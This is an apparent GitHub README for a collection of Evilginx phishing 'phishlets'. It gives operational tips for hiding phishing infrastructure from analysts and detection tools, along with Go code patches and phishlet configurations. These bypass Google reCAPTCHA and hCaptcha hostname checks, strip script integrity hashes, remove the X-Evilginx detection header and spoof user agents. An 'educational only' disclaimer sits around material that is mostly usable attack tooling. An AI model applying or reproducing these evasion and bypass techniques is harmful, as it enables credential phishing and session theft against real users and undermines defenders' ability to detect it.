<p align="center">
  <img alt="Evilginx2 Logo" src="https://raw.githubusercontent.com/kgretzky/evilginx2/master/media/img/evilginx2-logo-512.png" height="160" />
  <p align="center">
    <img alt="Evilginx2 Title" src="https://raw.githubusercontent.com/kgretzky/evilginx2/master/media/img/evilginx2-title-black-512.png" height="60" />
  </p>
</p>

> **Note:** This Repo is Only For Learning Purposes. Use phishlets at your own risk.

## Phishlets Developement Tips
- Always Use Debug Mode in evilginx During Testing 
- Not Everything is Working Here, Use these Phishlets to learn and to Play with Evilginx.
- Be Creative when it comes to bypassing protection.
- Javascript Injection can fix a lot of issues and will make your life easier during phishing engagements.
- Make sure to check Evilginx Docs [here](https://help.evilginx.com)

## Securing Evilginx Infra Tips
> **Note:** Phishing Engagement Infra Setup Guide .. [here](https://github.com/An0nUD4Y/Evilginx-Phishing-Infra-Setup)

Some tips and suggestions to help secure your Evilginx Infrastructure.
- Remove IOCs (X-Evilginx header and Default Cert Details)
- Modify Unauth redirect static contents
- Modify code to request wildcard certificates for root domain from Let'sEncrypt other than requesting for each subdomains (As mentioned in Kuba's blog) - Check this repo for reference https://github.com/ss23/evilginx2
- Put evilginx behind a proxy to help against  TLS fingerprinting (JA3 and JA3S)
- Use cloudflare in between if possible/feasible (You have to configure the SSL Settings correctly, change it to Full in cloudflare settings)
- Use some known ASN blacklist to avoid getting detected like here (https://github.com/aalex954/evilginx2-TTPs#ip-blacklist)
- Reduce the Number of proxyhosts in phishlet if possible to reduce content loading time.
- Host Evilginx at Azure and use their domain (limit proxy host in phishlet to 1 or find a way , may be create multiple azure sub domains and try with that)
- Add some sub_filters to modify the content of the pages to avoid content based detections, like (Favicon, form title font or style, or anything which seems relevant)
- Block the feedback/telemetry/logs/analytics subdomains using the phishlet sub_filters which can log the domain or may help later on analysis.
- See if js-injected is static or dynamic , if static modify the evilginx js-inject code to create dynamic/obfuscated version of your js for each user/target.
- Make sure to not leak your Evilginx infra IP, Check the DNS history to make sure its not stored anywhere (Analysts may look for older DNS Records of the domain)
- Be aware of this research : https://catching-transparent-phish.github.io/catching_transparent_phish.pdf , repo - https://catching-transparent-phish.github.io/


## Some Less Known Techniques
### Using Evilginx2 Phishlets with Evilginx3
- There's been some updates regarding how `js_inject` used to work in evilginx2, Check more [here](https://github.com/kgretzky/evilginx2/releases/tag/v3.0.0).
- To support the evilginx2 phishlets which had `js_inject` , You need to either modify its `trigger_paths` or you can just modify the evilginx3 Source code to support it.
- To know more [Check this](https://github.com/kgretzky/evilginx2/issues/904#issuecomment-1585787426)
- Modifying `core\phishlet.go` to allow regex in `trigger_paths` for `js_inject`.
```
\\Replace line (line 909)
re, err := regexp.Compile("^" + d + "$")

\\with line
re, err := regexp.Compile(d)
```

### Google Recaptcha Bypass : Method-1 (by [@Desire](https://twitter.com/DWORKWITH))
- Google recaptcha encodes domain in base64 and includes it in `co` parameter in GET request.
- For Example in safe-domain (Demo) Login.
  ```
  https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6LePlpgbAAAAAPlPfzzXnJ1lrMTqRWgouzDcSd3b&co=aHR0cHM6Ly9hY2NvdW50cy5zYWZlLWRvbWFpbi5jb206NDQz&hl=en&v=vP4jQKq0YJFzU6e21-BGy3GP&size=invisible&cb=knko72z68i8y
- Here the parameter `co` contains string `co=aHR0cHM6Ly9hY2NvdW50cy5zYWZlLWRvbWFpbi5jb206NDQz` which is the base64 encoding of `https://accounts.safe-domain.com:443`
- In case if we use MITM in between with the mitm domain `fake-domain.com`, the value for the `co` parameter will be set to `https://accounts.fake-domain.com:443` encoded in base64 `aHR0cHM6Ly9hY2NvdW50cy5mYWtlLWRvbWFpbi5jb206NDQzCg`  which is not a valid domain , So we need to modify this parameter value to the original domain `https://accounts.safe-domain.com:443` base64 encoded `aHR0cHM6Ly9hY2NvdW50cy5zYWZlLWRvbWFpbi5jb206NDQz`

- Here is the work around code to implement this. Replace the code in evilginx2 `core/http_proxy.go` line 409
```
				// patch GET query params with original domains & bypass recaptcha
				if pl != nil {
					qs := req.URL.Query()
					if len(qs) > 0 {
						for gp := range qs {
							for i, v := range qs[gp] {
								qs[gp][i] = string(p.patchUrls(pl, []byte(v), CONVERT_TO_ORIGINAL_URLS))
							if qs[gp][i] == "aHR0cHM6Ly9hY2NvdW50cy5mYWtlLWRvbWFpbi5jb206NDQzCg" { // https://accounts.fake-domain.com:443
								qs[gp][i] = "aHR0cHM6Ly9hY2NvdW50cy5zYWZlLWRvbWFpbi5jb206NDQz" // https://accounts.safe-domain.com:443
							}
							}
						}
						req.URL.RawQuery = qs.Encode()
					}
				}
```
### Google Recaptcha Bypass : Method-2
- This method works by modifying the javascript code responsible to generate the base64 string which contains the domain name.
- Subfilter can be modified accordingly based on the target site.
```
proxy_hosts:
  - {phish_sub: 'google', orig_sub: 'www', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'gstatic', orig_sub: 'www', domain: 'gstatic.com', session: true, is_landing: false, auto_filter: true}

sub_filters:
  - {triggers_on: 'www.google.com', orig_sub: 'www', domain: 'google.com', search: "integrity[ \t]*=[ \t]*[\"']sha384-.{64}[\"']", replace: 'integrity=""', mimes: ['text/javascript']}
  - {triggers_on: 'www.gstatic.com', orig_sub: 'accounts', domain: 'safe-domain.com', search: "\\(window.location.href\\)", replace: '(window.location.href.replace("{hostname}", "{orig_hostname}"))', mimes: ['text/javascript']}
```

### hCaptcha Bypass
hCaptcha does not validate the hostname of the website where it is loaded. However, during [server-side verification](https://docs.hcaptcha.com/#verify-the-user-response-server-side) of the CAPTCHA response, hCaptcha includes the hostname of the site where the challenge was completed. Since some websites may validate this hostname, tricking hCaptcha into believing it was loaded on the original hostname can be beneficial.
```
proxy_hosts:
  - {phish_sub: 'hcaptcha', orig_sub: '', domain: 'hcaptcha.com', session: true, is_landing: false, auto_filter: false}

sub_filters:
  - {triggers_on: 'hcaptcha.com', orig_sub: '', domain: 'democaptcha.com', search: 'window.location.hostname', replace: 'window.location.hostname.replace("{hostname}", "{orig_hostname}")', mimes: ['application/javascript']}
```

### Evilginx3 Easter Egg Patch (X-Evilginx Header)
- Evilginx3 contains easter egg code which adds a `X-Evilginx` header with each request.
- This header contains the Attacker Domain name. So it can be used for detection.
- To remove the Easter egg from evilginx just remove/comment below mentioned lines from the `core/http_proxy.go` file.
```
// Line 179
o_host := req.Host

// Line 330
req.Header.Set(p.getHomeDir(), o_host)

// Line 512
req.Header.Set(p.getHomeDir(), o_host)

// Line 1495
func (p *HttpProxy) getHomeDir() string {
	return strings.Replace(HOME_DIR, ".e", "X-E", 1) 
}
```

### Evilginx2 Easter Egg Patch (X-Evilginx Header)
- Evilginx2 contains easter egg code which adds a `X-Evilginx` header with each request.
- This header contains the Attacker Domain name. So it can be used for detection.
- To remove the Easter egg from evilginx just remove/comment below mentioned lines from the `core/http_proxy.go` file.
```
// Line 183
egg2 := req.Host

// Line 350
hg := []byte{0x94, 0xE1, 0x89, 0xBA, 0xA5, 0xA0, 0xAB, 0xA5, 0xA2, 0xB4}  

// Line 407
req.Header.Set(string(hg), egg2)  

// Line 377 to 379
for n, b := range hg {
		hg[n] = b ^ 0xCC
	}
  
// Line 562 to 566
e := []byte{208, 165, 205, 254, 225, 228, 239, 225, 230, 240}
for n, b := range e {
		e[n] = b ^ 0x88
}
req.Header.Set(string(e), e_host)

// Line 1456 to 1462
func (p *HttpProxy) cantFindMe(req *http.Request, nothing_to_see_here string) {
	var b []byte = []byte("\x1dh\x003,)\",+=")
	for n, c := range b {
		b[n] = c ^ 0x45
	}
	req.Header.Set(string(b), nothing_to_see_here)
}

// Line 580
p.cantFindMe(req, e_host)


```

### Add Custom User Agent
- Few sites have protections based on user agent, and relaying on javascript injections to modify the user agent on victim side may break/slow the attack process.
- Custom User Agent Can be Added on the fly by replacing the `User-Agent` Header in each requests.
- Below is the work Around Code to achieve this. You can add code in evilginx2 `core/http_proxy.go` file below line 395.
```
				// Replace Any User Agent With Firefox UserAgent
				useragent := req.Header.Get("User-Agent")
				if useragent != "" {                                   
							req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0")
							log.Debug("[%d] Injected User Agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/96.0 ", ps.Index)
				}

```

## Error Resolving
### Error-1 : (Failed to start nameserver on port 53)
METHOD 1 :-
- Follow These Commands & Then Try Relaunching Evilginx
```
sudo service systemd-resolved stop
nano /etc/resolv.conf
```
- Then change nameserver 127.x.x.x to nameserver 8.8.8.8
- Then save the file (By pressing CTRL+X and pressing Y followed by enter)

METHOD 2 :-
- Check if All the neccessary ports are not being used by some other services.
- Ports Like: 80, 53, 443
- Find Those Ports And Kill those Processes
```
sudo netstat -ptnl | grep 53
sudo kill PID
```
- Where PID is Process ID
- Similarly Find And Kill Process On other Ports That are in use.
- Now Try To Run Evilginx and get SSL certificates


## Need any Help ??
- Contact Me on telegram: https://t.me/its_udy (This is the only account belong to me)
- Please be aware of anyone impersonating my handle ( @an0nud4y is not my telegram handle)
- You can also contact me on twitter (http://m4lici0u5.com | http://an0nud4y.com)


## WARNING !
- DEVELOPER WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THE PHISHLETS. THESE PHISHLETS ARE ONLY FOR TESTING/LEARNING/EDUCATIONAL/SECURITY PURPOSES.
- DEVELOPER DO NOT SUPPORT ANY OF THE ILLEGAL ACTIVITIES.
- RELEASED THE WORKING/NON-WORKING PHISHLETS JUST TO LET OTHERS LEARN AND FIGURE OUT VARIOUS APPROACHES.
